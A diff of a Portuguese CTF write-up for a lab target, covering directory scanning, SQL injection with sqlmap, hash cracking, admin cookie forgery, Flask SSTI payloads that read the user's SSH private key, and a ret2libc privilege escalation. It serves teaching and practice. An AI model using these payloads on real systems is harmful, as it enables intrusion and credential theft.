@@ -1,4 +1,5 @@
 feito por F0x
+
 alvo: tribopapaxota.org
 
 ## **Task Code - Script**
@@ -9,7 +10,7 @@ console.log("Hello, patonymous!");
 ### **Solução**
 ![nmap](https://github.com/user-attachments/assets/d9fa24ac-cfb6-4dd8-b27d-28c1aad621da)
 
-acessando tribopapaxota.org, vi tava vazio ent ja fiz um scan de diretorios com o feroxbuster
+acessando tribopapaxota.org, vi que tava vazio então já fiz um scan de diretorios com o feroxbuster
 
 ![feroxbuster](https://github.com/user-attachments/assets/fc895173-f09e-4569-b7bc-01fec07fe920)
 
@@ -86,21 +87,31 @@ duck:cfaf278e8f522c72644cee2a753d2845
 Funciona!!
 
 (fui pesquisando pelo barulho q os animais faziam para ver se conseguia achar a pass)
+
 tiger:growl
+
 bear: -
+
 wolf:howl
+
 fox:yip
+
 eagle: -
+
 shark: -
+
 owl:hoot
+
 dolphin: -
+
 panda:bleat
 
-(passado um tempo, decidi focar em outra coisa, e dps voltar aqui)
+
+(passado um tempo, decidi focar em outra coisa, e depois voltar aqui)
 
 
 ## **Task Injection - Dump**
-Outro endpoint que está vazando informações.
+Extraia informações confidenciais!
 ### **Solução**
 já tinha reparado q quando punha um `'` o erro era diferente.
 Erro sem `'`
@@ -112,6 +123,7 @@ Erro com `'`
 ![login2](https://github.com/user-attachments/assets/f4c73ac9-ad29-4dab-8e15-5ec01e7b41d1)
 
 Já que estava a ficar sem opções e teorias, rodei um sqlmap só por descargo de consciência (e não é que era mesmo...)
+
 guardei a request acima (feita pelo burp) como request.txt, e rodei o comando:
 `sqlmap -r request.txt --dump`
 
@@ -124,7 +136,8 @@ QUACK{db_w45_dump3d}
 Qual a senha do usuário `fox`?
 ### **Solução**
 como vimos anteriormente na DB dumpada conseguimos o hash do user fox: 66b6d4c61b23a85b8d375e77104b9e14
-usei o https://crackstation.net -> yip (eu já tinha descoberto antes heheh)
+
+usei https://crackstation.net -> yip (eu já tinha descoberto antes)
 
 QUACK{yip}
 
@@ -133,10 +146,14 @@ QUACK{yip}
 Obtenha acesso acesso ao painel administrativo.
 ### **Solução**
 Tentar ficar admin, fiz login com as credenciais cat:meow,
+
 peguei nas credenciais do admin (user e hash md5):
 admin:703b179695b26fc01e4b18e3e605de2a
+
 (base64) -> YWRtaW46NzAzYjE3OTY5NWIyNmZjMDFlNGIxOGUzZTYwNWRlMmE=
-troquei a cookie DUCKY para esta
+
+troquei a cookie DUCKY para a que foi criada acima
+
 E conseguimos admin
 
 QUACK{4DM1N_15_N0T_S0_S3CUR3}
@@ -151,13 +168,19 @@ Qual a senha do usuário `admin`?
 ![dehashed](https://github.com/user-attachments/assets/dcaf8f84-6006-4fa8-88fb-e9eb40de63b6)
 
 `john hash.txt --wordlist=duckywalletV2.txt --format=Raw-MD5 --rules=best64 --fork=8`
+
 admin:DuckyW4ll3t!!
 
 
 ## **Task Endpoint - MFA (CONTINUAÇÃO)**
 (DPS DE 1-2 dias, muitas horas e muito fuzzing...)
+
 A RESPOSTA TAVA NA CARA O TEMPO TODO
-lembrei da BD dumpada, e da coluna totp_secret... (foi só parar e raciocinar) 
+
+lembrei da BD dumpada, e da coluna totp_secret... 
+
+(foi só parar e raciocinar) 
+
 Ás vezes a parte manual é importante e não só a automatizada com tools
 
 ![mfa2](https://github.com/user-attachments/assets/8ccf3407-8a25-4fb8-83ef-0fc0ef12efbb)
@@ -168,8 +191,11 @@ QUACK{T0TP_g3n3r4t0r_1s_t00_much_d4ng3r0u5}
 ## **Task Injection - Flask**
 Obtenha informações internas da aplicação Flask.
 ### **Solução**
-(usei as dicas mas já suspeitava q era para explorar um SSTI num cookie, https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)
-tools usadas: cyberchef.io
+(usei as dicas mas já suspeitava q era para explorar um SSTI num cookie, 
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)
+
+usando https://cyberchef.io
 
 `{{7*7}}`:703b179695b26fc01e4b18e3e605de2a (hash MD5 admin)
 (base64) -> e3s3Kjd9fTo3MDNiMTc5Njk1YjI2ZmMwMWU0YjE4ZTNlNjA1ZGUyYQ==
@@ -177,7 +203,9 @@ tools usadas: cyberchef.io
 ![ssti](https://github.com/user-attachments/assets/e0e88ff2-f2e4-44a8-88f2-ad2f283196ea)
 
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#python
+
 https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
+
 https://github.com/payloadbox/ssti-payloads
 
 Tentando alguns payloads chegamos a:
@@ -213,20 +241,35 @@ Você tem o suficiente para acessar o servidor!
 ![ssti_ls3](https://github.com/user-attachments/assets/d5a5c0e1-75bf-4313-83af-a5ba35cd7d7d)
 
 Organizado:
+
 total 100K 
+
 drwxr-xr-x 8 duck duck 4.0K Aug 22 17:49 . 
+
 drwxr-xr-x 4 root root 4.0K Aug 14 08:48 .. 
+
 drwxr-xr-x 2 root root 4.0K Aug 22 17:46 .bash_history 
+
 -rw-r--r-- 1 duck duck 220 Aug 14 08:48 .bash_logout 
+
 -rw-r--r-- 1 duck duck 3.7K Aug 22 17:49 .bashrc 
+
 drwxrwxr-x 3 duck duck 4.0K Aug 21 23:59 .cache 
+
 drwx------ 3 duck duck 4.0K Aug 21 20:35 .config 
--rw------- 1 duck duck 20 Aug 22 04:07 .lesshst 
+
+-rw------- 1 duck duck 20 Aug 22 04:07 .lesshst
+
 drwxrwxr-x 3 duck duck 4.0K Aug 21 20:45 .local 
+
 drwxrwxr-x 2 duck duck 4.0K Aug 14 09:14 manutencao 
+
 -rw-r--r-- 1 duck duck 807 Aug 14 08:48 .profile 
+
 drwx------ 2 duck duck 4.0K Aug 14 08:50 .ssh 
+
 -rw-rw-r-- 1 root root 27 Aug 22 00:37 wtduck.txt 
+
 -rw-rw-r-- 1 duck duck 48K Aug 22 17:48 .zcompdump
 
 
@@ -235,12 +278,19 @@ drwx------ 2 duck duck 4.0K Aug 14 08:50 .ssh
 
 ![ssti_ls4](https://github.com/user-attachments/assets/a262b00b-1205-47d4-9a16-60a892dd3aaa)
 
+Organizado:
 total 20K 
+
 drwx------ 2 duck duck 4.0K Aug 14 08:50 . 
+
 drwxr-xr-x 8 duck duck 4.0K Aug 22 17:49 .. 
+
 -rw-rw-r-- 1 duck duck 570 Aug 14 08:50 authorized_keys 
+
 -r-------- 1 duck duck 2.6K Aug 14 08:49 id_rsa 
+
 -r--r--r-- 1 duck duck 570 Aug 14 08:49 id_rsa.pub
+
 
 `{{config.__class__.__init__.__globals__['os'].popen('cat /home/duck/.ssh/id_rsa').read()}}`:703b179695b26fc01e4b18e3e605de2a
 (base64) -> e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdjYXQgL2hvbWUvZHVjay8uc3NoL2lkX3JzYScpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh
@@ -248,8 +298,11 @@ drwxr-xr-x 8 duck duck 4.0K Aug 22 17:49 ..
 ![id_rsa](https://github.com/user-attachments/assets/df5fbc76-cace-45dd-8570-6d4ddac07806)
 
 copiar para id_rsa
+
 `chmod 600 id_rsa`
+
 `ssh -i id_rsa duck@tribopapaxota.org`
+
 
 ![duck](https://github.com/user-attachments/assets/ba7ce33b-060d-43f3-885d-a4e74f86fb9e)
 
@@ -273,16 +326,22 @@ Tive que deixar uma mensagem :)
 
 ![checksec](https://github.com/user-attachments/assets/f00fa3e6-9b5d-48a6-bfcb-4ec6537764c4)
 
-vi q tinha NX e fui pesquisar sobre "ELF binary exploitation NX bypass" e vi um termo um pouco familiar "ret2libc", pesquisando mais sobre encontrei o seguinte blog
-https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/
-mas eu queria mais, procurando no YT por videos de ret2libc até que encontrei 
-https://www.youtube.com/watch?v=tMN5N5oid2c
+vi q tinha NX e fui pesquisar sobre "ELF binary exploitation NX bypass" e vi um termo um pouco familiar "ret2libc", 
+
+pesquisando mais sobre encontrei o seguinte blog: https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/
+
+mas eu queria mais, procurando no YT por videos de ret2libc até que encontrei: https://www.youtube.com/watch?v=tMN5N5oid2c
+
 (era exatamente o que eu estava á procura, explicando em detalhe, cada passo, até um pouco de bases fundamentais)
 
 O que instalar:
+
 gbg gef - https://github.com/hugsy/gef
+
 pwntools (pip3 install pwn)
+
 pwninit - https://github.com/io12/pwninit/releases/download/3.3.1/pwninit
+
 
 Depois de baixar o binário e a lib:
 1. `pwninit --bin duck2root --libc libc.so.6`
@@ -345,6 +404,6 @@ p.interactive()
 
 QUACK{R3t2l1bc_1s_t00_3a5y_t0_3xpl01t}
 
-And ofc I had to leave a message as root to :)
+E claro que também tive de deixar uma mensagem como root :)
 
 ![exploit_message](https://github.com/user-attachments/assets/8b8edaee-3e07-409f-927f-2d375637502d)
